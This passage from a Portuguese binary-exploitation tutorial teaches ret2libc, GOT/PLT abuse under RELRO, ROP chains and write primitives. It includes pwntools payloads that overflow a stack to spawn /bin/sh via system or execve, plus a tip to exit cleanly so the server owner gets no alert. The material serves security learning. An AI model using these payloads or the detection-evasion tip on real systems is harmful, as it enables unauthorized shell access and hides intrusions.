função pre-pronta pra nos dar uma shell :(</p>
<p>Felizmente, existe LibC, e dentro dela existem múltiplas funções úteis!</p>
<a class="header" href="print.html#funções-Úteis" id="funções-Úteis"><h1>Funções Úteis</h1></a>
<a class="header" href="print.html#system" id="system"><h2>System()</h2></a>
<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
<p>Para nosso propósito, ela recebe 1 argumento, o caminho do programa para
executar (Ex: <code>/bin/sh</code>)</p>
<p>Em C:</p>
<pre><code class="language-C">#include &lt;stdlib.h&gt;
int main() {
    system(&quot;/bin/ls&quot;);
    return 0;
}
</code></pre>
<p>Em assembly:</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;/bin/ls&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        call    System
        mov     eax, 0
        pop     rbp
        ret
</code></pre>
<p>A função recebe um pointer para a string via <code>rdi</code> (64 bits) ou os
argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32
bits!</p>
<a class="header" href="print.html#conseguindo-o-pointer-para-binsh" id="conseguindo-o-pointer-para-binsh"><h4>Conseguindo o pointer para /bin/sh</h4></a>
<p>Usando pwntools:</p>
<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
</code></pre>
<p>x sera um pointer contendo o endereço da string <code>/bin/sh</code></p>
<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
<a class="header" href="print.html#layout-da-stack-numa-call-32-bits" id="layout-da-stack-numa-call-32-bits"><h4>Layout da stack numa call 32 bits</h4></a>
<pre><code class="language-x86asm">    Func_1
 ____________
|            |
|    RBP     | 
|____________| 
 ____________
|            |
|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
|____________|      Porem, nao costumamos pensar o que acontece depois!
 ____________
|            |      Um ret simplesmente significa:
|   ARG_1    |         pop RIP
|____________|         jmp RIP
 ____________           
|            |      E como em qualquer pop, RSP se movimenta
|   ARG_2    |
|____________| 

    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
|____________|   Então da perspectiva de System,   |____________|
 ____________           ARG_1 vira RIP              ____________       
|            |          ARG_2 vira ARG_1           |            |
|    RIP     |   ____                              |            |
|____________|       |                             |____________|
 ____________        |                              ____________
|            |       V                             |            |  
|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|   ARG_2    |                                     |   ARG_1    |
|____________|                                     |____________|


    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
| AAAAAAAAAA |    A Func_1 esta vulnerável a BOF   |            |
|____________|                                     |____________|
 ____________                                       ____________       
|            |    E nos controlamos a stack :D     |            |
|  SYSTEM()  |    Então podemos passar os args     |            |
|____________|    e o RIP de retorno para System   |____________|
 ____________                                       ____________
|            |                                     |            |  
|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
|____________|                                     |____________|

                  System (ou qualquer outra 
                  função que voce chamar) 
                  vai executar /bin/sh e 
                  tentar retornar para DDDDDDDD

</code></pre>
<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo
(<code>fork</code>, gerando um processo secundário: <code>child_proc</code>)!</p>
<p>Então retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera
reportado para o processo principal e nao para o computador!</p>
<blockquote>
<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
</blockquote>
<a class="header" href="print.html#unindo-tudo" id="unindo-tudo"><h3>Unindo tudo</h3></a>
<p>Vamos supor que o programa esta vulnerável a um BoF tradicional na função
<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40            # Padding
payload += p32(libc.sym.system) # RIP salvo batata()
payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
</code></pre>
<p>Caso voce esteja com pressa, adios!</p>
<p>Daqui em diante eu vou discutir técnicas alternativas de ret2libc, vantagens
e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender
ROP!</p>
<a class="header" href="print.html#pontos-fracos" id="pontos-fracos"><h1>Pontos Fracos</h1></a>
<a class="header" href="print.html#estaticamente-linkado" id="estaticamente-linkado"><h2>Estaticamente Linkado</h2></a>
<p>Em programas estaticamente linkados ao libc, somente podemos usar uma
fração das funções presentes, pois somente as que sao originalmente usadas
pelo programa sao linkadas!</p>
<a class="header" href="print.html#dinamicamente-linkado--aslr" id="dinamicamente-linkado--aslr"><h2>Dinamicamente Linkado (+ ASLR)</h2></a>
<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o
potencial do libc. Porem caso o computador possua ASLR ligado, sera
necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou
executar o exploit em loop ate voce dar sorte (viável somente em
computadores 32 bits).</p>
<a class="header" href="print.html#funções-uteis-pt-2" id="funções-uteis-pt-2"><h1>Funções Uteis Pt 2</h1></a>
<a class="header" href="print.html#execve--exit" id="execve--exit"><h2>Execve() + Exit()</h2></a>
<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e
funciona igual <code>System</code>, porem com uma diferença: <code>System</code> cria um novo
processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em
<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce
simplesmente chamar ele, quando voce fechar a shell vai gerar uma
<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e
ativando mecanismos de segurança que alertam o dono do servidor!</p>
<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o
programa finalize silenciosamente!</p>
<p>Alem disso, existe mais uma diferença, <code>execve</code> recebe 3 argumentos:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  execve(&quot;./blablabla&quot;, NULL, NULL);
  return 1;
}
</code></pre>
<p>O primeiro: programa a ser executado</p>
<p>O segundo: argv (poderíamos passar <code>-p</code> para <code>sh</code> manter os privilégios)</p>
<p>O terceiro: envp (environment vars)</p>
<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
<p>Em 64 bits precisaríamos de múltiplos gadgets para salvar um em cada register</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edx, 0                ; envp
        mov     esi, 0                ; argv
        mov     edi, OFFSET FLAT:.LC0 ; programa
        call    execve
        mov     eax, 1
        pop     rbp
        ret
</code></pre>
<p>Caso voce queira usar argv:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, NULL);
  return 1;
}
</code></pre>
<pre><code class="language-x86asm">.LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        lea     rax, [rbp-32]
        mov     edx, 0
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC2
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, envp);
  return 1;
}}
</code></pre>
<pre><code class="language-x86asm">..LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;env1&quot;
.LC3:
        .string &quot;env2&quot;
.LC4:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 64
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
        mov     QWORD PTR [rbp-48], 0
        lea     rdx, [rbp-64]
        lea     rax, [rbp-32]
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC4
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>Bem, agora que voce voltou de ficar brincando com a função, vamos voltar a pratica:</p>
<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40                              # Padding
payload += p32(libc.sym.execve)                   # RIP salvo batata()
payload += p32(libc.sym.exit)                     # RIP salvo execve()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
payload += p32(0)                                 # argv execve()
payload += p32(0)                                 # envp execve()
</code></pre>
<p>Os argumentos estão sendo passados conforme convenção... mas eu nao posso garantir!</p>
<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, preguiça hehehe :/</p>
<blockquote>
<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima técnica (<code>mprotect</code>)
sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
</blockquote>
<a class="header" href="print.html#mprotect--ret2shellcode" id="mprotect--ret2shellcode"><h2>Mprotect() + ret2shellcode</h2></a>
<p><code>Mprotect</code> pode ser usado para tornar uma região da memoria <code>RWX</code> novamente!</p>
<p>A funcao recebe 3 argumentos: mprotect(addr, size, perms)</p>
<p>Assim, em 64 bits vamos precisar de uma chain, e em 32 bits dar push da
direita pra esquerda!</p>
<pre><code>mprotect
ret       -&gt; shellcode
addr
size
perms
</code></pre>
<a class="header" href="print.html#argumentos" id="argumentos"><h3>Argumentos</h3></a>
<a class="header" href="print.html#addr" id="addr"><h4>Addr</h4></a>
<p>O endereço deve ser alinhado ao page_size, assim podemos fazer:</p>
<pre><code class="language-py">((addr &gt;&gt; 4*n) &lt;&lt; 4*n)
</code></pre>
<p>Alinhando o endereço fazendo shift-direita shift-esquerda, 4 por digito hex!</p>
<pre><code class="language-py">&gt;&gt;&gt; hex((0x7ffe23668bf4 &gt;&gt; 12) &lt;&lt; 12 )
'0x7ffe23668000'
</code></pre>
<a class="header" href="print.html#size" id="size"><h4>Size</h4></a>
<p>O valor deve ser multiplo de page_size, exemplo:
0x1000 em x86_64</p>
<p>Para encontrar esse valor na arquitetura que voce esta usando, basta ler o
manual (opção chata e 0% descolada) ou usar <code>page_size = getpagesize ();</code> em C</p>
<a class="header" href="print.html#perms" id="perms"><h4>Perms</h4></a>
<p>As permissões sao: <code>PERM_READ, PERM_WRITE,... etcetc</code></p>
<blockquote>
<p>OBS: existem outras permissões relacionadas a memoria privada vs compartilhada etc</p>
</blockquote>
<p>Porem, essas sao somente macros de valor substituídas por <code>ints</code></p>
<blockquote>
<p>read=1 write=2 exec=4</p>
</blockquote>
<p>Assim, para termos todas as permissões, o valor de perms deve ser <code>7</code>!</p>
<a class="header" href="print.html#classificação" id="classificação"><h3>Classificação</h3></a>
<p>Esses tipo de exploit se classifica como: exploit de múltiplas etapas</p>
<p>Assim, tornando a região do nosso shellcode executável, e somente depois
pulando para ele!
Esses exploits vem se tornando mais e mais comuns conforme novas proteções
sao adicionadas!</p>
<a class="header" href="print.html#analise" id="analise"><h3>Analise</h3></a>
<p>Porem, essa técnica sera usada predominantemente em SROP 64 bits !</p>
<p>Caso voce nao esteja vendo SROP no momento, pode pular e voltar no futuro!</p>
<p>Eu recomendo que voce pegue o exemplo em <code>man mprotect</code> e brinque com ele +
<code>strace --trace=mprotect</code> para criar uma intuição!</p>
<p>Eu alterei o meu para ficar assim:</p>
<pre><code class="language-C">#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

static int alloc_size;
static char* memory;

// gcc c.c -o c

void segv_handler (int signal_number) 
{
 printf (&quot;memory accessed!\n&quot;);
 mprotect (memory, alloc_size, PROT_READ | PROT_WRITE);
} 

void foo() {
 mprotect (memory, alloc_size, 2);
}

int main ()
{
 int fd;
 struct sigaction sa;

 /* Install segv_handler as the handler for SIGSEGV. */
 memset (&amp;sa, 0, sizeof (sa));
 sa.sa_handler = &amp;segv_handler;
 sigaction (SIGSEGV, &amp;sa, NULL);
 
 /* Allocate one page of memory by mapping /dev/zero. Map the memory
   as write-only, initially. */
 alloc_size = getpagesize ();
 fd = open (&quot;/dev/zero&quot;, O_RDONLY);
 memory = mmap (NULL, alloc_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
 close (fd);

 /* Write to the page to obtain a private copy. */
 memory[0] = 0;

 foo();


 /* Write to the allocated memory region. */
 memory[0] = 1;

 /* All done; unmap the memory. */
 printf (&quot;all done\n&quot;);
 munmap (memory, alloc_size);
 return 0;
}
</code></pre>
<p>Eu coloquei a funcao dentro do <code>foo()</code>, caso o gcc esteja colocando ela inline,
vale a pena checar as flags de otimização!</p>
<p>A funcao fica:</p>
<pre><code class="language-x86asm">   0x00005555555552a7 &lt;+0&gt;:	endbr64 
   0x00005555555552ab &lt;+4&gt;:	push   rbp
   0x00005555555552ac &lt;+5&gt;:	mov    rbp,rsp
   0x00005555555552af &lt;+8&gt;:	mov    eax,DWORD PTR [rip+0x2d63]  # alloc_size
   
b  0x00005555555552b5 &lt;+14&gt;:	movsxd rcx,eax
   
b  0x00005555555552b8 &lt;+17&gt;:	mov    rax,QWORD PTR [rip+0x2d61]  # memory

b  0x00005555555552bf &lt;+24&gt;:	mov    edx,0x2

   0x00005555555552c4 &lt;+29&gt;:	mov    rsi,rcx
   0x00005555555552c7 &lt;+32&gt;:	mov    rdi,rax

b  0x00005555555552ca &lt;+35&gt;:	call   0x555555555150 &lt;mprotect@plt&gt;

   0x00005555555552cf &lt;+40&gt;:	nop
   0x00005555555552d0 &lt;+41&gt;:	pop    rbp
   0x00005555555552d1 &lt;+42&gt;:	ret  
</code></pre>
<p><code>b</code> sao os breakpoints</p>
<p>Em seguida, crie o seguinte gdbscript</p>
<pre><code>disassemble foo

b *foo+14
b *foo+17
b *foo+24
b *foo+35

r
info registers $eax
c
info registers $eax $rcx
c
info registers $rax
c
info registers $edx $rsi $rcx $rdi $rax
</code></pre>
<p>Assim, temos uma visão de todos os registers afetados na funcao! E fica mais
fácil de brincar com o programa, ver o que causa erro, etcetc....</p>
<pre><code class="language-x86asm">Efetivamente, a funcao recebe:
edx = flags
rsi = page size
rdi = addr

Breakpoint 4, 0x00005555555552ca in foo ()
edx            0x2                 2
rsi            0x1000              4096
rdi            0x7ffff7fc7000      140737353904128
</code></pre>
<ul>
<li><a href="print.html#resumo">Resumo</a></li>
<li><a href="print.html#perspectiva-de-atacante">Perspectiva de Atacante</a>
<ul>
<li><a href="print.html#relro-parcial">RELRO Parcial</a></li>
<li><a href="print.html#relro-full">RELRO Full</a></li>
</ul>
</li>
<li><a href="print.html#analise-a-fundo-plt-e-ldso-todo">Analise A Fundo PLT e ld.so ~TODO~</a></li>
</ul>
<a class="header" href="print.html#resumo" id="resumo"><h1>Resumo</h1></a>
<ul>
<li>
<p>A GOT armazena o endereço da funcao apos ser resolvido!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endereço ja tenha sido resolvido, <code>jmp</code> la</p>
</li>
<li>
<p>Caso a funcao <strong>NAO</strong> tenha sido chamada e consequentemente o endereço ainda
nao tenha sido resolvido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<pre><code class="language-x86asm">pwndbg&gt; disassemble vuln
        push   rbp
        mov    rbp,rsp
        sub    rsp,0x20
break &gt; lea    rdi,[rip+0xec3]

        call   0x401030 &lt;puts@plt&gt;

break &gt; lea    rax,[rbp-0x20]
        mov    rdi,rax
        mov    eax,0x0
        call   0x401040 &lt;gets@plt&gt;
        nop
        leave  
        ret

pwndbg&gt; b vuln
pwndbg&gt; b *vuln+20

-------------------------------------
- Antes de puts ter sido executada  -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x401036 (puts@plt+6) ◂— push   0 /* 'h' */
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) ◂— push   1

pwndbg&gt; disassemble 0x401036
    jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;puts@got.plt&gt;
    push   0x0
    jmp    0x401020


-------------------------------------
- Depois de puts ter sido executada -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e655f0 (puts) ◂— push   r14
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) ◂— push   1

</code></pre>
<a class="header" href="print.html#perspectiva-de-atacante" id="perspectiva-de-atacante"><h1>Perspectiva de Atacante</h1></a>
<a class="header" href="print.html#relro-parcial" id="relro-parcial"><h2>RELRO Parcial</h2></a>
<p>Caso o RELRO seja parcial, nos podemos alterar o valor na got, fazendo uma call
ser redirecionada para, por exemplo, um shellcode!</p>
<p>Esse tipo de cenário pode ser encontrado em vulnerabilidades
<code>escrever-n-bytes---em-algum-lugar</code> !</p>
<p>Alem disso podemos ler ela e obter um leak, descrito no proximo exemplo!</p>
<a class="header" href="print.html#relro-full" id="relro-full"><h2>RELRO Full</h2></a>
<p>Com RELRO Full, nos podemos somente ler a GOT (que ja vem com valores
pre-resolvidos).</p>
<p>Porem isso se mostra util pois, podemos mandar esse endereco de volta
( por meio de um <code>puts</code> por exemplo ) e usar esse leak para desativar ASLR!</p>
<p>Ou podemos calcular a distancia dentro do libc entre a <code>funcao do leak</code> e
<code>system</code>.</p>
<p>Em seguida ajustar esse valor (<code>pop rbp; add rax, rbp</code>, com <code>rax = leak</code>) e chama-lo: <code>call rax</code>, novamente burlando ASLR! :D</p>
<a class="header" href="print.html#analise-a-fundo-plt-e-ldso-todo" id="analise-a-fundo-plt-e-ldso-todo"><h1>Analise A Fundo PLT e ld.so ~TODO~</h1></a>
<a class="header" href="print.html#intro-rop" id="intro-rop"><h1>Intro ROP</h1></a>
<ul>
<li><a href="print.html#intro-rop">Intro ROP</a></li>
<li><a href="print.html#teoria">Teoria</a>
<ul>
<li><a href="print.html#ret">Ret</a></li>
<li><a href="print.html#gadgets">Gadgets</a></li>
<li><a href="print.html#chains">Chains</a></li>
</ul>
</li>
<li><a href="print.html#ferramentas">Ferramentas</a></li>
<li><a href="print.html#curiosidades">Curiosidades</a></li>
</ul>
<p>ROP (programação orientada ao retorno) foi um técnica desenvolvida
para burlar todas as limitações e mecanismos de segurança
impostos no <code>RIP</code>!</p>
<p>Vamos considerar que todas mitigações exceto <code>PIE</code> estão ativas!</p>
<a class="header" href="print.html#teoria" id="teoria"><h1>Teoria</h1></a>
<a class="header" href="print.html#ret" id="ret"><h2>Ret</h2></a>
<p>O que faz o <code>RIP</code> ser especial? Em um nível abstrato, quais sao
suas propriedades genéricas que o dao sua funcionalidade??</p>
<ul>
<li>[1] ~ O RIP aponta para um endereço na memoria</li>
<li>[2] ~ Em seguida, ele age com base no valor presente</li>
<li>[3] ~ Ele automaticamente avança (aumenta seu endereço)</li>
<li>[4] ~ jmp [1]</li>
</ul>
<p>Existe algum outro que possa operar dessa maneira? Sim! o <code>RSP</code>!</p>
<p>Quando o processador executa <code>RET</code>, o endereço no topo da stack
(aonde <code>RSP</code> aponta) sera colocado no <code>RIP</code> e o <code>RSP</code> se ajusta:
<code>RSP += 8</code>! :D</p>
<a class="header" href="print.html#gadgets" id="gadgets"><h2>Gadgets</h2></a>
<p>Um gadget consiste em uma sequencia de instruções, seguidas de um
<code>RET</code>. Por exemplo:</p>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret

</code></pre>
<p>Vamos supor que apos um BoF, o <code>RIP</code> salvo esta num offset de 40.</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += b&quot;B&quot; * 8
</code></pre>
<p>Quando a função vulnerável retornar, o valor no topo da stack sera
<code>&amp;gadget_1</code></p>
<pre><code class="language-x86asm">vulnerável:             stack:
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1 &lt;- RSP
                        BBBBBBBB


A execução sera redirecionada, e o RSP ira avançar


gadget_1:               stack:
    mov rax rbx &lt;- RIP  AAAAAAAA
    mov r12 r13         ...
    ret                 AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

As duas instruções serão executadas!

gadget_1:               stack:
    mov rax rbx         AAAAAAAA
    mov r12 r13         ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endereço invalido, gerando uma SEGFAULT
</code></pre>
<p>E caso a instrução seja um  <code>POP</code>? o <code>RSP</code> andaria? Sim, e precisamos levar
isso em consideração</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_2
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += b&quot;B&quot; * 8 # RET
</code></pre>
<p>E vamos supor que os registers sao inicializados com <code>OOOOOOOO</code></p>
<pre><code class="language-x86asm">vulnerável:             stack:              
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2 &lt;- RSP
                        TTTTTTTT
                        YYYYYYYY
                        BBBBBBBB


A execução sera redirecionada, e o RSP ira avançar !
Ate aqui foi igual ao anterior!

gadget_2:               stack:              registers:
    pop rdi &lt;- RIP      AAAAAAAA                RDI = OOOOOOOO    
    pop rbp             ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT &lt;- RSP
                        YYYYYYYY 
                        BBBBBBBB

pop rdi sera executado, salvando o valor no topo da stack em RDI e avançando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp &lt;- RIP      ...                     RBP = OOOOOOOO
    ret                 AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY &lt;- RSP
                        BBBBBBBB


pop rbp sera executado, salvando o valor no topo da stack em RBP e avançando RSP

gadget_2:               stack:              registers:
    pop rdi             AAAAAAAA                RDI = TTTTTTTT    
    pop rbp             ...                     RBP = YYYYYYYY
    ret     &lt;- RIP      AAAAAAAA
                        gadget_2
                        TTTTTTTT 
                        YYYYYYYY
                        BBBBBBBB &lt;- RSP

E agora, a funcao retornara para BBBBBBBB, um endereço invalido, gerando uma SEGFAULT
</code></pre>
<a class="header" href="print.html#chains" id="chains"><h2>Chains</h2></a>
<p>E se, ao invés de retornarmos para <code>BBBBBBBB</code>, retornássemos para outro gadget?</p>
<p>Seria tipo uma corrente:</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>___com um gadget executando e redirecionando para o proximo....</p>
<p>Assim, poderíamos devagarinho reconstruir o nosso shellcode, a partir de partes
pre-existentes do código!</p>
<p>E como <code>PIE</code> esta desativado, a secao de código do binário NAO tem seu
endereço randomizado!</p>
<blockquote>
<p>OBS: Voce nao pode usar a secao de código do libc como gadgets, pois ele tem
o endereço randomizado (ASLR)</p>
</blockquote>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret
</code></pre>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += gadget_1
payload += gadget_1
payload += gadget_2 
payload += b&quot;T&quot; * 8 # RDI
payload += b&quot;Y&quot; * 8 # RBP
payload += gadget_1
payload += b&quot;B&quot; * 8 # SEGFAULT
</code></pre>
<p>Essa chain em especifico nao faz nada de util, somente demonstrar como chains
podem ser construidas!</p>
<p>Numa situação real nao teríamos uma <code>SEGFAULT</code> no final, pois ja teríamos uma
shell antes de chegar a esse ponto!</p>
<a class="header" href="print.html#ferramentas" id="ferramentas"><h1>Ferramentas</h1></a>
<p>Existem múltiplas ferramentas capazes de encontrar gadgets e ate gerar chains
automaticamente!</p>
<p>Eu recomendo voce testar e ver o que prefere!</p>
<ul>
<li><a href="https://github.com/Boyan-MILANOV/ropium">ropium</a></li>
<li><a href="https://github.com/sashs/Ropper">ropper</a></li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ropGadget</a></li>
<li><a href="https://docs.pwntools.com/en/latest/rop.html">O submodulo do pwntools</a></li>
</ul>
<hr />
<p>E enquanto eu pegava os links no github..
eu encontrei esse em rust:
<a href="https://github.com/Ben-Lichtman/ropr/tree/master/src">ropr</a></p>
<p>Que parece ser bem interessante, mas ainda vou testar!</p>
<hr />
<p>Todas as ferramentas possuem funcionalidade de filtrar gadgets com badchars,
automaticamente gerar chains...</p>
<p>Eu pessoalmente gosto de ropper e do pwntools (pq ter tudo dentro do mesmo
framework == incrível)</p>
<a class="header" href="print.html#curiosidades" id="curiosidades"><h1>Curiosidades</h1></a>
<p>Em arquiteturas <code>RISC</code>, todas as instruções tem o mesmo tamanho (em bytes)...</p>
<p>Porem em <code>x86</code> (<code>CISC</code>), as instruções podem desde 2 bytes, ate 5/6/7 bytes!</p>
<p>Assim, as ferramentas que encontram gadgets podem criar instruções que
originalmente nao existiam no programa!</p>
<pre><code>Exemplo (fictício, pq eu to com preguiça ler o manual e ver os bytecodes)

O programa originalmente ve:

12 34   56 78 91    12 34  90
|       |           |      |
Add     Pop         Add    NOP

Porem, a ferramenta pode escolher um offset com alinhamento diferente do anterior:

12      34 56 78    91 12   34 90
|       |           |       |
AND     Sub         Push    XOR

Mesmos bytes, instruções diferentes

</code></pre>
<ul>
<li><a href="print.html#primitivos">Primitivos</a></li>
<li><a href="print.html#classifica%C3%A7%C3%A3o">Classificação</a>
<ul>
<li><a href="print.html#write---what---where">Write - What - Where</a>
<ul>
<li><a href="print.html#exemplo">Exemplo</a></li>
</ul>
</li>
<li><a href="print.html#write---something---where">Write - Something - Where</a></li>
<li><a href="print.html#modificador">Modificador</a></li>
</ul>
</li>
<li><a href="print.html#incomuns">Incomuns</a></li>
<li><a href="print.html#dicas">Dicas</a>
<ul>
<li><a href="print.html#valores-pre-modificados">Valores pre modificados</a></li>
<li><a href="print.html#alinhamento-da-stack">Alinhamento da stack</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#primitivos" id="primitivos"><h1>Primitivos</h1></a>
<p>Primitivos sao a base dos exploits modernos, um primitivo pode ser desde uma
sequencia especifica de gadgets, funções, etcetc.</p>
<p>Normalmente, voce vai adicionar funções aos seus scripts que usem o primitivo,
acelerando a velocidade de desenvolvimento dos exploits.</p>
<a class="header" href="print.html#classificação-1" id="classificação-1"><h1>Classificação</h1></a>
<a class="header" href="print.html#write---what---where" id="write---what---where"><h2>Write - What - Where</h2></a>
<p>Esse primitivo te permite escrever algo (what) em algum lugar, esse algo pode
ser desde 1 byte, ate uma qword inteira!</p>
<a class="header" href="print.html#exemplo" id="exemplo"><h3>Exemplo</h3></a>
<p>Uma chain que escreve um byte em um local:</p>
<pre><code class="language-x86asm">gadget_pop_rdi:
    pop rdi
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Gadgets normalmente nao sao exatamente o que a gente precisa, então as vezes
precisamos ocupar a stack com &quot;lixinho&quot; para compensar!</p>
<p>Sim... esse e o nome técnico correto! E nao tem argumento que me va me
convencer do contrario!</p>
<pre><code class="language-py">def write_byte(what, where);
